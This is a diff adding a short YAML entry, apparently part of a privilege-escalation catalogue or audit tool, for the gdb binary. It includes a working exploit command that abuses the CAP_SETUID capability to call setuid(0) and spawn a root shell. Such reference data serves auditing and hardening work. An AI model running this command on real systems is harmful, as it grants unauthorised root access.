@@ -1,0 +1,6 @@
+name: gdb
+binary_path: /usr/bin/gdb
+exploit_cmds:
+- /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
+required_caps:
+- CAP_SETUID
